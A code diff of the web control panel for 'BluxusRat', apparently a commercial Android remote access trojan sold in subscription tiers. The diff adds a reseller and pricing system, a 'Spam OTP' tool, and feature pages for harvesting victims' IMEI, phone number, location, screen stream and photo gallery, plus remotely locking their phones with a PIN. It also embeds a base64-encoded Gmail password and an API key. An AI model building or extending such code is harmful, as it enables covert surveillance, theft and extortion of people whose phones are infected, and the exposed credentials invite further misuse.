@@ -1,5 +1,6 @@
 /* ============================================================
  * BluxusRat V1 [NewEra] — Script
+ * Version 3.0 — Email via SMTPJS
  * ============================================================ */
 
 // ============================================================
@@ -17,7 +18,7 @@ const firebaseConfig = {
 };
 
 // ============================================================
-// CONFIG API
+// CONFIG
 // ============================================================
 const CONFIG = {
   FAZZ_KEY: "fcs_live_ff8116a26bea56e04330d6c249a26c3c88e9d4f1",
@@ -26,7 +27,195 @@ const CONFIG = {
   TERMAI_URL: "https://c.termai.cc",
   ANIME_API: "https://apii.nexadev.my.id/anime",
   ANIME_BANNER: "https://api.nexadev.my.id/api/random/anime",
-  MAX_UPLOAD: 2 * 1024 * 1024
+  MAX_UPLOAD: 2 * 1024 * 1024,
+  WA_ADMIN: "6283137236898",
+  WA_CHANNEL: "https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w",
+  WA_GROUP: "https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU"
+};
+
+// ============================================================
+// GMAIL SMTP (SMTPJS)
+// ============================================================
+const GMAIL = {
+  user: "bluxus.order@gmail.com",
+  pass_encoded: "eHhibXNocWJnenp5a3B1eg==",
+  fromName: "BluxusRat"
+};
+
+function getGmailPass() {
+  try { return atob(GMAIL.pass_encoded); }
+  catch (e) { return ""; }
+}
+
+async function sendEmail({ to, subject, htmlBody }) {
+  return new Promise((resolve, reject) => {
+    if (typeof Email === "undefined") {
+      return reject(new Error("SMTPJS belum ke-load"));
+    }
+    Email.send({
+      Host: "smtp.gmail.com",
+      Username: GMAIL.user,
+      Password: getGmailPass(),
+      To: to,
+      From: GMAIL.user,
+      Subject: subject,
+      Body: htmlBody
+    }).then(msg => resolve(msg)).catch(err => reject(err));
+  });
+}
+
+function buildEmailHTML({ username, password, role, duration, orderId }) {
+  return `
+    <div style="font-family:'Inter',Arial,sans-serif;background:#0d0709;padding:40px 20px;color:#f5f5f5">
+      <div style="max-width:520px;margin:0 auto;background:#160d10;border:1px solid #2a1a1a;border-radius:16px;overflow:hidden">
+        <div style="background:linear-gradient(135deg,#c41e28,#8b0000);padding:28px 24px;text-align:center">
+          <div style="font-family:'Poppins',Arial,sans-serif;font-size:28px;font-weight:800;letter-spacing:-1px;color:#fff">BluxusRat</div>
+          <div style="font-size:10px;letter-spacing:4px;color:#ffffffcc;text-transform:uppercase;margin-top:4px">V1 [NewEra]</div>
+        </div>
+        <div style="padding:28px 24px">
+          <h2 style="font-family:'Poppins',Arial,sans-serif;font-size:18px;color:#fff;margin:0 0 8px 0">Akun Kamu Siap 🎉</h2>
+          <p style="font-size:13px;color:#a39599;line-height:1.7;margin:0 0 20px 0">Pesanan kamu udah diverifikasi. Berikut detail akun kamu:</p>
+          <div style="background:#0d0709;border:1px solid #2a1a1a;border-radius:12px;padding:18px;margin-bottom:18px">
+            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Username</span><span style="color:#f5f5f5;font-weight:700;font-family:'JetBrains Mono',monospace">${username}</span></div>
+            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Password</span><span style="color:#c41e28;font-weight:700;font-family:'JetBrains Mono',monospace;font-size:14px">${password}</span></div>
+            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Role</span><span style="color:#f5f5f5;font-weight:700">${role}</span></div>
+            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Durasi</span><span style="color:#f5f5f5;font-weight:700">${duration}</span></div>
+            <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px"><span style="color:#a39599">Order ID</span><span style="color:#f5f5f5;font-weight:700;font-family:'JetBrains Mono',monospace;font-size:11px">${orderId}</span></div>
+          </div>
+          <div style="background:#ffa50220;border-left:3px solid #ffa502;border-radius:8px;padding:14px;margin-bottom:20px">
+            <div style="font-size:12px;color:#ffa502;font-weight:700;margin-bottom:4px">⚠️ Penting</div>
+            <div style="font-size:12px;color:#a39599;line-height:1.6">Segera ganti password kamu setelah login pertama untuk keamanan akun.</div>
+          </div>
+          <p style="font-size:12px;color:#a39599;line-height:1.7;margin:0">Kalau ada pertanyaan, hubungi admin via WhatsApp atau channel komunitas.</p>
+        </div>
+        <div style="background:#0d0709;padding:18px 24px;border-top:1px solid #2a1a1a;text-align:center">
+          <div style="font-size:11px;color:#5a4548">© 2026 BluxusRat — All rights reserved.</div>
+        </div>
+      </div>
+    </div>`;
+}
+
+// ============================================================
+// ROLE & PRICE DATA
+// ============================================================
+const PRICE_DATA = {
+  member: {
+    label: "Member",
+    icon: "fa-user",
+    color: "member",
+    tagline: "Role dasar",
+    desc: "Role paling dasar di BluxusRat. Cocok buat yang baru mulai. Bisa akses semua fitur Tools reguler & BluxAnime, plus kontrol device target.",
+    benefits: ["Akses semua Tools reguler", "Akses BluxAnime", "Kontrol device target", "Bisa beli tambah sender", "Support komunitas"],
+    options: [
+      { label: "1 hari", days: 1, price: 2000 },
+      { label: "7 hari", days: 7, price: 13000 },
+      { label: "30 hari", days: 30, price: 25000 },
+      { label: "Unlimited", days: -1, price: 45000 }
+    ]
+  },
+  vip: {
+    label: "VIP",
+    icon: "fa-crown",
+    color: "vip",
+    tagline: "Tools tambahan",
+    desc: "Role VIP punya akses ke semua fitur Member + VIP Tools (Spam OTP). Cocok buat yang butuh fitur lebih.",
+    benefits: ["Semua benefit Member", "Akses VIP Tools (Spam OTP)", "Priority support", "Badge VIP di profil"],
+    options: [
+      { label: "1 hari", days: 1, price: 3000 },
+      { label: "7 hari", days: 7, price: 20000 },
+      { label: "30 hari", days: 30, price: 35000 },
+      { label: "Unlimited", days: -1, price: 50000 }
+    ]
+  },
+  reseller: {
+    label: "Reseller",
+    icon: "fa-briefcase",
+    color: "reseller",
+    tagline: "Bisa bikin akun",
+    desc: "Reseller bisa bikin akun Member & VIP untuk dijual ke orang lain. Limit 5 akun/hari.",
+    benefits: ["Semua benefit VIP", "Bisa bikin akun Member & VIP", "Limit 5 akun/hari", "Statistics bawahan sendiri", "Bisa perpanjang expired bawahan"],
+    options: [
+      { label: "7 hari", days: 7, price: 45000 },
+      { label: "30 hari", days: 30, price: 80000 },
+      { label: "Unlimited", days: -1, price: 150000 }
+    ]
+  },
+  owner: {
+    label: "Owner",
+    icon: "fa-shield-halved",
+    color: "owner",
+    tagline: "Kelola sistem",
+    desc: "Owner punya akses lebih luas dari Reseller. Bisa broadcast, liat server log, dan add user tanpa limit.",
+    benefits: ["Semua benefit Reseller", "Unlimited bikin akun", "Broadcast pengumuman", "Server logs", "Akses lebih luas"],
+    options: [
+      { label: "7 hari", days: 7, price: 85000 },
+      { label: "30 hari", days: 30, price: 150000 },
+      { label: "Unlimited", days: -1, price: 300000 }
+    ]
+  }
+};
+
+const FAQ_DATA = [
+  { q: "Apa itu BluxusRat?", a: "BluxusRat adalah control panel untuk monitoring & kontrol device yang terhubung. Bisa liat info device, lokasi, kirim command, dan lain-lain." },
+  { q: "Bagaimana cara upgrade role?", a: "Untuk upgrade role, hubungi Owner atau Reseller resmi. Pembayaran & durasi role akan diatur sesuai kesepakatan." },
+  { q: "Apa beda VIP sama Member?", a: "VIP punya akses ke VIP Tools (Spam OTP) yang gak ada di Member." },
+  { q: "Apa beda Reseller sama VIP?", a: "Reseller bisa bikin akun Member & VIP untuk dijual. VIP cuma bisa pake fitur." },
+  { q: "Kenapa akun gw expired?", a: "Masa aktif akun udah lewat. Hubungi Owner/Reseller atau pakai Redeem Code." },
+  { q: "Fitur Live Cam kok gak muncul?", a: "Live Cam cuma support Android 11+." },
+  { q: "Kenapa target gw gak muncul di Rat?", a: "Target bakal muncul kalo dia install APK dengan userCode yang sesuai." },
+  { q: "Apa itu userCode?", a: "UserCode adalah kode unik yang nentuin target mana yang masuk ke akun lo." },
+  { q: "Gimana cara hubungi Owner?", a: "Buka halaman About → klik 'Abyy' atau join channel WhatsApp." },
+  { q: "Apakah akun bisa dipakai di banyak device?", a: "Bisa, selama login pake username & password yang sama." }
+];
+
+const ROLE_PERMS = {
+  dev: {
+    panel: [
+      { id: "add_user", name: "Add User", icon: "fa-user-plus" },
+      { id: "manage_user", name: "Manage User", icon: "fa-users-gear" },
+      { id: "ban_user", name: "Ban User", icon: "fa-ban" },
+      { id: "reset_pw", name: "Reset Password", icon: "fa-key" },
+      { id: "broadcast", name: "Broadcast", icon: "fa-bullhorn" },
+      { id: "stats", name: "Statistics", icon: "fa-chart-line" },
+      { id: "maintenance", name: "Maintenance", icon: "fa-screwdriver-wrench" },
+      { id: "logs", name: "Server Logs", icon: "fa-file-lines" }
+    ],
+    ekonomi: true
+  },
+  owner: {
+    panel: [
+      { id: "add_user", name: "Add User", icon: "fa-user-plus" },
+      { id: "broadcast", name: "Broadcast", icon: "fa-bullhorn" },
+      { id: "logs", name: "Server Logs", icon: "fa-file-lines" }
+    ],
+    ekonomi: false
+  },
+  reseller: {
+    panel: [
+      { id: "add_user", name: "Add User", icon: "fa-user-plus" },
+      { id: "extend_user", name: "Extend User", icon: "fa-clock-rotate-left" },
+      { id: "stats", name: "Statistics", icon: "fa-chart-line" }
+    ],
+    ekonomi: false
+  },
+  vip: { panel: [], ekonomi: false },
+  member: { panel: [], ekonomi: false }
+};
+
+const CREATE_PERMS = {
+  dev: ["owner", "reseller", "vip", "member"],
+  owner: ["reseller", "vip", "member"],
+  reseller: ["member", "vip"],
+  vip: [],
+  member: []
+};
+
+const DAILY_LIMIT = {
+  dev: null,
+  owner: null,
+  reseller: 5,
+  vip: 0,
+  member: 0
 };
 
 // ============================================================
@@ -34,10 +223,13 @@ const CONFIG = {
 // ============================================================
 const State = {
   user: null, uid: null, page: "dash", targets: [],
-  unsubLive: null, unsubLoc: null, currentTarget: null,
+  unsubLive: null, unsubLoc: null, unsubGallery: null,
+  currentTarget: null, currentFeature: null,
   audio: null, currentTrack: null,
   animeSearchMode: false, animeCurrentDetail: null,
-  db: null
+  db: null,
+  buy: { role: null, days: null, price: null, label: null },
+  order: { tab: "pending", search: "", items: [], current: null }
 };
 
 const LOADING_TEXTS = [
@@ -60,7 +252,7 @@ function haptic(ms = 10) {
 }
 
 // ============================================================
-// LOAD FIREBASE SDK
+// FIREBASE SDK
 // ============================================================
 async function loadFirebaseSDK() {
   const appMod = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js");
@@ -79,12 +271,24 @@ async function loadFirebaseSDK() {
 // ============================================================
 // UTIL
 // ============================================================
-function isVIP() {
-  return State.user && (
-    State.user.role === "vip" ||
-    State.user.role === "reseller" ||
-    State.user.role === "owner"
-  );
+function isDev() { return State.user?.role === "dev"; }
+function isOwner() { return State.user?.role === "owner"; }
+function isReseller() { return State.user?.role === "reseller"; }
+function isVIP() { return State.user && ["vip", "reseller", "owner", "dev"].includes(State.user.role); }
+
+function getDeviceName(t) {
+  if (!t) return "Unknown Device";
+  if (t.brand && t.brand !== "Unknown" && t.brand !== "") {
+    return t.brand.charAt(0).toUpperCase() + t.brand.slice(1).toLowerCase();
+  }
+  if (t.model && t.model !== "Unknown") return t.model;
+  return "Unknown Device";
+}
+
+function isAndroid11Plus(t) {
+  if (!t) return false;
+  const sdk = parseInt(t.sdk || "0");
+  return sdk >= 30;
 }
 
 function showScreen(id) {
@@ -144,26 +348,13 @@ function fmtSize(bytes) {
   return (bytes / 1048576).toFixed(2) + " MB";
 }
 
+function fmtPrice(n) {
+  return "Rp " + n.toLocaleString("id-ID");
+}
+
 function cleanTitle(t) {
   if (!t) return "";
   return t.split("\t")[0].trim();
-}
-
-// Nama device pake BRAND (dari owner side)
-function getDeviceName(t) {
-  if (!t) return "Unknown Device";
-  if (t.brand && t.brand !== "Unknown" && t.brand !== "") {
-    return t.brand.charAt(0).toUpperCase() + t.brand.slice(1).toLowerCase();
-  }
-  if (t.model && t.model !== "Unknown") return t.model;
-  return "Unknown Device";
-}
-
-// Cek Android version >= 11 (SDK >= 30)
-function isAndroid11Plus(t) {
-  if (!t) return false;
-  const sdk = parseInt(t.sdk || "0");
-  return sdk >= 30;
 }
 
 async function sha256(text) {
@@ -182,6 +373,17 @@ function genUserCode() {
   const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
   const gen = () => [...crypto.getRandomValues(new Uint8Array(4))].map(b => chars[b % chars.length]).join("");
   return `${gen()}-${gen()}-${gen()}-${gen()}`;
+}
+
+function genOrderId() {
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  const gen = () => [...crypto.getRandomValues(new Uint8Array(4))].map(b => chars[b % chars.length]).join("");
+  return `ORD-${gen()}-${gen()}`;
+}
+
+function genPassword(len = 8) {
+  const chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+  return [...crypto.getRandomValues(new Uint8Array(len))].map(b => chars[b % chars.length]).join("");
 }
 
 async function copyToClipboard(text) {
@@ -332,14 +534,20 @@ async function goDashboard() {
   $("#dash-welcome-name").textContent = u.username || "User";
   const badge = $("#dash-badge");
   badge.textContent = role.toUpperCase();
-  badge.className = "wb-badge" + (role === "vip" ? " vip" : "");
+  badge.className = "wb-badge " + role;
   $("#sb-sub").textContent = u.username || "—";
-  if (role !== "member") {
+
+  if (["dev", "owner", "reseller"].includes(role)) {
     $("#sb-role-sep").classList.remove("hidden");
     $("#sb-panel").classList.remove("hidden");
   } else {
     $("#sb-role-sep").classList.add("hidden");
     $("#sb-panel").classList.add("hidden");
+  }
+  if (role === "dev") {
+    $("#sb-ekonomi").classList.remove("hidden");
+  } else {
+    $("#sb-ekonomi").classList.add("hidden");
   }
   markSidebar("dash");
   await loadTargets();
@@ -370,9 +578,11 @@ function goPage(page) {
   if (page === "rat") return goRat();
   if (page === "anime") return goAnime();
   if (page === "tools") return goTools();
+  if (page === "benefit") return goBenefit();
   if (page === "account") return goAccount();
   if (page === "about") return showScreen("about");
   if (page === "panel") return goPanel();
+  if (page === "ekonomi") return goEkonomi();
 }
 
 // ============================================================
@@ -453,7 +663,7 @@ function renderTargetList() {
     const bat = t.battery || 0;
     const low = bat < 20;
     const batIcon = bat > 75 ? "full" : bat > 50 ? "three-quarters" : bat > 25 ? "half" : "quarter";
-    const deviceName = getDeviceName(t);  // ← PAKE BRAND
+    const deviceName = getDeviceName(t);
     return `
       <div class="target-item" data-tid="${t.id}">
         <div class="ti-avatar"><i class="fa-solid fa-mobile-screen"></i></div>
@@ -484,163 +694,159 @@ function goRat() {
   loadTargets();
 }
 
+// ============================================================
+// TARGET DETAIL (Feature Grid)
+// ============================================================
+const FEATURES = [
+  { id: "info", icon: "fa-mobile-screen-button", name: "Info Device", desc: "Detail device target", page: "fp-info" },
+  { id: "live", icon: "fa-desktop", name: "Live Cam", desc: "Stream layar target", page: "fp-live" },
+  { id: "locate", icon: "fa-location-dot", name: "Locate", desc: "Lokasi target", page: "fp-locate" },
+  { id: "flash", icon: "fa-flashlight", name: "Senter & Strobo", desc: "Kontrol flashlight", page: "fp-flash" },
+  { id: "lock", icon: "fa-lock", name: "Kunci HP", desc: "Lock overlay target", page: "fp-lock" },
+  { id: "volume", icon: "fa-volume-high", name: "Set Volume", desc: "Atur volume target", page: "fp-volume" },
+  { id: "brightness", icon: "fa-sun", name: "Set Kecerahan", desc: "Atur brightness", page: "fp-brightness" },
+  { id: "url", icon: "fa-link", name: "URL Direct", desc: "Buka URL di target", page: "fp-url" },
+  { id: "gallery", icon: "fa-images", name: "Get Gallery", desc: "Ambil foto target", page: "fp-gallery" }
+];
+
 function openTargetDetail(tid) {
   const t = State.targets.find(x => x.id === tid);
   if (!t) return;
   State.currentTarget = t;
-  
+  State.currentFeature = null;
   const deviceName = getDeviceName(t);
-  const androidVer = t.android || "?";
-  const canLiveCam = isAndroid11Plus(t);  // ← CEK ANDROID VERSION
-  
-  const box = $("#modal-box");
-  box.innerHTML = `
-    <h3>${deviceName}</h3>
-    <div class="sub">ID: ${tid}</div>
-    <div class="tabs">
-      <button data-tab="info" class="active"><i class="fa-solid fa-circle-info"></i> Info</button>
-      <button data-tab="live"><i class="fa-solid fa-desktop"></i> Live</button>
-      <button data-tab="locate"><i class="fa-solid fa-location-dot"></i> Locate</button>
-      <button data-tab="tools"><i class="fa-solid fa-toolbox"></i> Tools</button>
-    </div>
-    <div class="tab-panel active" data-panel="info">
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Status</span><span style="color:${t.status === 'online' ? 'var(--success)' : 'var(--text-dim)'};font-weight:700">${(t.status || "offline").toUpperCase()}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Brand</span><span style="font-weight:600">${t.brand || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Model</span><span style="font-weight:600">${t.model || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">IP</span><span style="font-weight:600;font-family:'JetBrains Mono',monospace">${t.ip || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Android</span><span style="font-weight:600">${androidVer}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">SDK</span><span style="font-weight:600">${t.sdk || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">IMEI</span><span style="font-weight:600;font-family:'JetBrains Mono',monospace;font-size:11px">${t.imei || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">SIM</span><span style="font-weight:600">${t.simOperator || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Phone</span><span style="font-weight:600">${t.phoneNumber || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Battery</span><span style="font-weight:600">${t.battery ? t.battery + "%" : "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Wifi</span><span style="font-weight:600;font-size:11px">${t.wifiSSID || "—"}</span></div>
-      <div style="height:1px;background:var(--border)"></div>
-      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0"><span style="color:var(--text-dim)">Last Seen</span><span style="font-weight:600">${timeAgo(t.lastSeen)}</span></div>
-    </div>
-    <div class="tab-panel" data-panel="live">
-      <div class="toggle-row ${canLiveCam ? "" : "disabled"}" ${canLiveCam ? "" : 'style="opacity:.5"'}>
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-video"></i></div>
-          <div class="tr-info">
-            <div class="n">Live Cam</div>
-            <div class="d">${canLiveCam ? "Stream layar target" : "Cuma work di Android 11+"}</div>
-          </div>
-        </div>
-        <label class="switch">
-          <input type="checkbox" id="sw-live" ${canLiveCam ? "" : "disabled"}>
-          <span class="slider"></span>
-        </label>
-      </div>
-      ${!canLiveCam ? `<div style="font-size:11px;color:var(--warning);padding:10px;background:var(--warning-soft);border-radius:8px;margin-top:8px;text-align:center"><i class="fa-solid fa-triangle-exclamation"></i> Target pake Android ${androidVer} (SDK ${t.sdk || "?"}). Live Cam cuma support Android 11+ (SDK 30+).</div>` : ""}
-      <div class="live-view" id="live-view" style="margin-top:12px">
-        <div class="empty"><i class="fa-solid fa-image"></i><div>${canLiveCam ? "Live cam nonaktif" : "Tidak tersedia"}</div></div>
-      </div>
-    </div>
-    <div class="tab-panel" data-panel="locate">
-      <div class="toggle-row">
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div>
-          <div class="tr-info"><div class="n">Locate</div><div class="d">Lokasi target</div></div>
-        </div>
-        <label class="switch">
-          <input type="checkbox" id="sw-loc"><span class="slider"></span>
-        </label>
-      </div>
-      <div class="loc-map" id="loc-map">
-        <div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>
-      </div>
-      <div class="loc-coords" id="loc-coords">—</div>
-    </div>
-    <div class="tab-panel" data-panel="tools">
-      <div class="toggle-row">
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div>
-          <div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div>
-        </div>
-        <label class="switch">
-          <input type="checkbox" id="sw-flash"><span class="slider"></span>
-        </label>
-      </div>
-      <div class="toggle-row">
-        <div class="tr-left">
-          <div class="ico-badge"><i class="fa-solid fa-bolt"></i></div>
-          <div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip tiap 1 detik</div></div>
-        </div>
-        <label class="switch">
-          <input type="checkbox" id="sw-strobo"><span class="slider"></span>
-        </label>
-      </div>
-    </div>
-    <div class="modal-actions">
-      <button class="btn btn-danger" id="btn-delete-target"><i class="fa-solid fa-trash"></i> Hapus</button>
-      <button class="btn btn-ghost" onclick="closeModal()">Tutup</button>
+  $("#target-title").textContent = deviceName;
+  showScreen("target");
+  renderFeatureGrid(t);
+  closeAllFeaturePages();
+}
+
+function renderFeatureGrid(t) {
+  const grid = $("#feature-grid");
+  grid.innerHTML = FEATURES.map(f => {
+    let disabled = false;
+    if (f.id === "live" && !isAndroid11Plus(t)) disabled = true;
+    return `
+      <div class="feature-card ${disabled ? "disabled" : ""}" data-fid="${f.id}">
+        <div class="fc-icon"><i class="fa-solid ${f.icon}"></i></div>
+        <div class="fc-name">${f.name}</div>
+        <div class="fc-desc">${f.desc}${disabled ? " (Android 11+)" : ""}</div>
+      </div>`;
+  }).join("") + `
+    <div class="feature-card danger" data-fid="delete">
+      <div class="fc-icon"><i class="fa-solid fa-trash"></i></div>
+      <div class="fc-name">Hapus Target</div>
+      <div class="fc-desc">Hapus target & semua data</div>
     </div>`;
-  $("#modal").classList.add("show");
-  
-  // Tab switching
-  $$(".tabs button", box).forEach(b => {
-    b.onclick = () => {
-      haptic(5);
-      $$(".tabs button", box).forEach(x => x.classList.remove("active"));
-      b.classList.add("active");
-      const tab = b.dataset.tab;
-      $$(".tab-panel", box).forEach(p => p.classList.toggle("active", p.dataset.panel === tab));
-      if (tab === "live" && canLiveCam) setupLiveScreen(tid);
-      if (tab === "locate") setupLocate(tid);
+
+  $$(".feature-card", grid).forEach(el => {
+    el.onclick = () => {
+      haptic(10);
+      const fid = el.dataset.fid;
+      if (fid === "delete") return confirmDeleteTarget(t);
+      if (el.classList.contains("disabled")) return toast("Fitur ini gak tersedia di perangkat target", "warn");
+      openFeaturePage(fid, t);
     };
   });
-  
-  // Toggle events
-  if (canLiveCam) {
-    $("#sw-live", box).onchange = (e) => toggleLive(tid, e.target.checked);
-  }
-  $("#sw-loc", box).onchange = (e) => toggleLocate(tid, e.target.checked);
-  $("#sw-flash", box).onchange = (e) => toggleFlash(tid, e.target.checked);
-  $("#sw-strobo", box).onchange = (e) => toggleStrobo(tid, e.target.checked);
-  
-  // Tombol hapus target
-  $("#btn-delete-target").onclick = async () => {
-    haptic(20);
-    if (!confirm(`Hapus target "${deviceName}"?\n\nSemua data (commands, live, locations) akan dihapus.`)) return;
+}
+
+function openFeaturePage(fid, t) {
+  State.currentFeature = fid;
+  closeAllFeaturePages();
+  const feat = FEATURES.find(f => f.id === fid);
+  if (!feat) return;
+  $("#feature-grid").style.display = "none";
+  const page = $("#" + feat.page);
+  if (!page) return;
+  page.classList.add("active");
+
+  if (fid === "info") renderInfoPage(t);
+  if (fid === "live") renderLivePage(t);
+  if (fid === "locate") renderLocatePage(t);
+  if (fid === "flash") setupFlashToggles(t);
+  if (fid === "lock") setupLockPage(t);
+  if (fid === "volume") setupVolumePage(t);
+  if (fid === "brightness") setupBrightnessPage(t);
+  if (fid === "url") setupUrlPage(t);
+  if (fid === "gallery") setupGalleryPage(t);
+}
+
+function closeAllFeaturePages() {
+  $$(".feature-page").forEach(p => p.classList.remove("active"));
+  $("#feature-grid").style.display = "grid";
+}
+
+function confirmDeleteTarget(t) {
+  const deviceName = getDeviceName(t);
+  if (!confirm(`Hapus target "${deviceName}"?\n\nSemua data (commands, live, locations) akan dihapus permanen.`)) return;
+  haptic(20);
+  (async () => {
     try {
-      await fbRemove(fbRef(State.db, "targets/" + tid));
-      await fbRemove(fbRef(State.db, "commands/" + tid));
-      await fbRemove(fbRef(State.db, "live/" + tid));
-      await fbRemove(fbRef(State.db, "locations/" + tid));
+      await fbRemove(fbRef(State.db, "targets/" + t.id));
+      await fbRemove(fbRef(State.db, "commands/" + t.id));
+      await fbRemove(fbRef(State.db, "live/" + t.id));
+      await fbRemove(fbRef(State.db, "locations/" + t.id));
+      await fbRemove(fbRef(State.db, "gallery/" + t.id));
       toast("Target dihapus", "ok");
-      closeModal();
-      loadTargets();
+      goRat();
     } catch (e) {
       toast("Gagal hapus: " + e.message, "err");
     }
-  };
+  })();
 }
 
-async function sendCommand(tid, type, payload = {}) {
-  try {
-    const cmdRef = fbPush(fbRef(State.db, "commands/" + tid));
-    await fbSet(cmdRef, {
-      type, payload,
-      fromUid: State.uid,
-      status: "pending",
-      createdAt: Date.now()
-    });
-    return true;
-  } catch (e) {
-    toast("Gagal kirim command", "err");
-    return false;
+// ============================================================
+// FEATURE PAGES
+// ============================================================
+function renderInfoPage(t) {
+  const rows = [
+    ["Status", t.status === "online" ? "ONLINE" : "OFFLINE", t.status === "online" ? "var(--success)" : "var(--text-dim)"],
+    ["Brand", t.brand || "—"],
+    ["Model", t.model || "—"],
+    ["IP", t.ip || "—"],
+    ["Android", t.android || "—"],
+    ["SDK", t.sdk || "—"],
+    ["IMEI", t.imei || "—"],
+    ["SIM Operator", t.simOperator || "—"],
+    ["SIM Country", t.simCountry || "—"],
+    ["Phone Number", t.phoneNumber || "—"],
+    ["Battery", t.battery ? t.battery + "%" : "—"],
+    ["Charging", t.charging ? "Ya" : "Tidak"],
+    ["Wifi SSID", t.wifiSSID || "—"],
+    ["Carrier", t.carrier || "—"],
+    ["Screen", t.screenRes || "—"],
+    ["RAM Total", t.ramTotal ? (parseInt(t.ramTotal) / 1073741824).toFixed(2) + " GB" : "—"],
+    ["RAM Free", t.ramFree ? (parseInt(t.ramFree) / 1073741824).toFixed(2) + " GB" : "—"],
+    ["Storage Total", t.storageTotal ? (parseInt(t.storageTotal) / 1073741824).toFixed(2) + " GB" : "—"],
+    ["Storage Free", t.storageFree ? (parseInt(t.storageFree) / 1073741824).toFixed(2) + " GB" : "—"],
+    ["Last Seen", timeAgo(t.lastSeen)]
+  ];
+  $("#info-content").innerHTML = rows.map(([label, val, color]) => `
+    <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0;border-bottom:1px solid var(--border)">
+      <span style="color:var(--text-dim)">${label}</span>
+      <span style="font-weight:600;${color ? 'color:' + color : ''};text-align:right;max-width:60%;word-break:break-all">${val}</span>
+    </div>
+  `).join("");
+}
+
+function renderLivePage(t) {
+  const canLive = isAndroid11Plus(t);
+  const warning = $("#live-warning");
+  const toggleRow = $("#live-toggle-row");
+  const sw = $("#sw-live");
+
+  if (!canLive) {
+    warning.classList.remove("hidden");
+    $("#live-android-ver").textContent = t.android || "?";
+    sw.disabled = true;
+    sw.checked = false;
+    toggleRow.style.opacity = ".5";
+  } else {
+    warning.classList.add("hidden");
+    sw.disabled = false;
+    toggleRow.style.opacity = "1";
   }
+  sw.onchange = (e) => toggleLive(t.id, e.target.checked);
 }
 
 async function toggleLive(tid, on) {
@@ -668,6 +874,11 @@ function setupLiveScreen(tid) {
       if (v) v.innerHTML = `<img src="${d.frame}" alt="live">`;
     }
   });
+}
+
+function renderLocatePage(t) {
+  const sw = $("#sw-loc");
+  sw.onchange = (e) => toggleLocate(t.id, e.target.checked);
 }
 
 async function toggleLocate(tid, on) {
@@ -700,16 +911,118 @@ function setupLocate(tid) {
   });
 }
 
-async function toggleFlash(tid, on) {
-  haptic(15);
-  await sendCommand(tid, on ? "flashlight_on" : "flashlight_off");
-  toast(on ? "Senter nyala" : "Senter mati", "ok");
+function setupFlashToggles(t) {
+  const swFlash = $("#sw-flash");
+  const swStrobo = $("#sw-strobo");
+  swFlash.onchange = async (e) => {
+    haptic(15);
+    await sendCommand(t.id, e.target.checked ? "flashlight_on" : "flashlight_off");
+    toast(e.target.checked ? "Senter nyala" : "Senter mati", "ok");
+  };
+  swStrobo.onchange = async (e) => {
+    haptic(15);
+    await sendCommand(t.id, e.target.checked ? "strobo_on" : "strobo_off");
+    toast(e.target.checked ? "Strobo nyala" : "Strobo mati", "ok");
+  };
 }
 
-async function toggleStrobo(tid, on) {
-  haptic(15);
-  await sendCommand(tid, on ? "strobo_on" : "strobo_off");
-  toast(on ? "Strobo nyala" : "Strobo mati", "ok");
+function setupLockPage(t) {
+  const sw = $("#sw-lock");
+  const pin = $("#lock-pin");
+  sw.onchange = async (e) => {
+    haptic(15);
+    const code = pin.value.trim();
+    if (e.target.checked) {
+      if (code.length !== 4) {
+        e.target.checked = false;
+        return toast("PIN harus 4 digit", "err");
+      }
+      await sendCommand(t.id, "lock_on", { pin: code });
+      toast("HP target dikunci", "ok");
+    } else {
